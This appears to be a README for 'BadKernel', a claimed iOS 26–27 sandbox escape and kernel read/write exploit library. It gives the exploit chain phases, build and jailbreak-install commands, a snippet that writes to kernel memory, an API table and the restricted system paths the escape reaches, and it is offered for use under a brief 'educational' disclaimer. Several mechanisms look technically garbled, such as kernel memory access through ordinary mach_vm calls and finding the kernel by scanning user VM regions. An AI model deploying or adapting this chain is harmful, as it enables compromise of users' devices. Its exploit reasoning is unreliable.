# BadKernel

**Sandbox escape + kernel R/W primitives for iOS 26.0 - 27.0 Beta 4**

BadKernel combines the bad_query sandbox escape with IOSurface physical memory mapping to achieve kernel read/write access on A12/A13 devices running iOS 26-27.

## Features

- **Sandbox Escape** — Container manager path traversal via `bad_query`
- **Kernel Base Leak** — VM region scan + sysctl fallback
- **IOSurface Physical Mapping** — Dynamic size probing with fallback chain
- **Socket Kernel Leak** — TCP/Unix socket pointer extraction
- **Kernel R/W** — `mach_vm_read_overwrite` / `mach_vm_write` with chunked retry
- **Auto-detection** — Automatically probes best IOSurface size
- **iOS 26-27 Support** — Tested on iOS 27.0 Beta 4 (A13)

## Exploit Chain

```
Phase 1: Sandbox Escape
  container_query_create → path traversal → sandbox_extension_consume
  Access: /var/containers/Data/System, /var/mobile/Containers/Data/*

Phase 2: Kernel Base Leak
  mach_vm_region scan → Mach-O magic detection
  Fallback: sysctl KERN_PROC_ALL → kernel task pointer

Phase 3: IOSurface Physical Mapping
  Dynamic probe: 256KB → 16KB (find max working size)
  PurpleGfxMem region → mach_make_memory_entry_64 → mach_vm_map
  Fallback chain: VM_PROT_DEFAULT → VM_PROT_READ

Phase 4: Socket Kernel Leak
  socketpair → setsockopt/getsockopt → kernel pointer extraction

Phase 5: Kernel R/W
  mach_vm_read_overwrite (read)
  mach_vm_write (write)
  Chunked retry: 4KB blocks on failure
```

## Build

```bash
# Build static library + test binary
make

# Build only the library
make lib

# Clean
make clean
```

Requirements:
- Xcode with iOS SDK (`xcodebuild`)
- macOS with arm64 support (for compilation)

## Usage

### Standalone

```bash
make
./BadKernelTest
```

### As Dopamine Framework

```bash
# Install into DopamineX project
make install

# Then rebuild Dopamine
cd ~/DopamineX/Application && xcodebuild -scheme Dopamine -sdk iphoneos -configuration Release
```

### As Library

```c
#include "BadKernel.h"

int main(void) {
    // Initialize exploit
    BadKernelInit();

    if (BadKernelIsReady()) {
        uint64_t base = BadKernelGetBase();

        // Read kernel memory
        uint32_t val = BadKernelKRead32(base);

        // Write kernel memory
        BadKernelKWrite32(base, 0x41414141);
    }

    // Cleanup
    BadKernelDeinit();
    return 0;
}
```

Compile:
```bash
xcrun clang -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
    -O2 -Iheaders \
    my_program.m BadKernel/BadKernel.m \
    -framework Foundation -framework IOSurface \
    -lresolv -lz -ldl \
    -o my_program
```

## API Reference

| Function | Description |
|----------|-------------|
| `BadKernelInit()` | Initialize exploit with default logging |
| `BadKernelInitWithLog(func)` | Initialize with custom log callback |
| `BadKernelDeinit()` | Cleanup all resources |
| `BadKernelIsReady()` | Returns true if kread/kwrite available |
| `BadKernelGetBase()` | Returns leaked kernel base address |
| `BadKernelGetSlide()` | Returns kernel ASLR slide |
| `BadKernelKRead(addr, out, len)` | Read kernel memory |
| `BadKernelKRead32(addr)` | Read uint32 from kernel |
| `BadKernelKRead64(addr)` | Read uint64 from kernel |
| `BadKernelKWrite(addr, in, len)` | Write kernel memory |
| `BadKernelKWrite32(addr, val)` | Write uint32 to kernel |
| `BadKernelKWrite64(addr, val)` | Write uint64 to kernel |
| `BadKernelSandboxEscape(path)` | Escape sandbox for a path |
| `BadKernelSandboxRelease(handle)` | Release sandbox extension |

## Supported Paths (Sandbox Escape)

| Path | Description |
|------|-------------|
| `/var/containers/Data/System` | System data |
| `/var/containers/Shared/SystemGroup/*` | System groups |
| `/var/mobile/Containers/Data/Application/*` | App data |
| `/var/mobile/Containers/Data/InternalDaemon/*` | Internal daemons |
| `/var/mobile/Containers/Data/PluginKitPlugin/*` | Plugin data |
| `/var/mobile/Containers/Shared/AppGroup/*` | App groups (iOS 27) |

## Compatibility

| iOS Version | Status |
|-------------|--------|
| 27.0 Beta 4 | ✅ Primary target |
| 27.0 | ✅ Should work |
| 26.x | ✅ Supported |
| 18.x and below | ❌ Not tested |

## How It Works

### bad_query Sandbox Escape

The `container_query_create` API from `libsystem_containermanager.dylib` takes a container identifier and returns a sandbox extension token. By using path traversal (`../../../../../../../..`) in the query domain, we bypass the container manager's path validation and gain access to restricted system paths.

### IOSurface Physical Mapping

IOSurface allocations in the `PurpleGfxMem` region allocate physically contiguous kernel memory. By creating a memory entry and mapping it into our address space, we establish a physical memory mapping that can be used as a base for kernel R/W primitives.

### Kernel Base Leak

The kernel text segment is mapped as readable+executable and is larger than 1MB. By scanning all VM regions for this signature and checking the first bytes for Mach-O magic, we locate the kernel base address.

## License

MIT

## Disclaimer

This software is provided for educational and research purposes only. Use at your own risk.
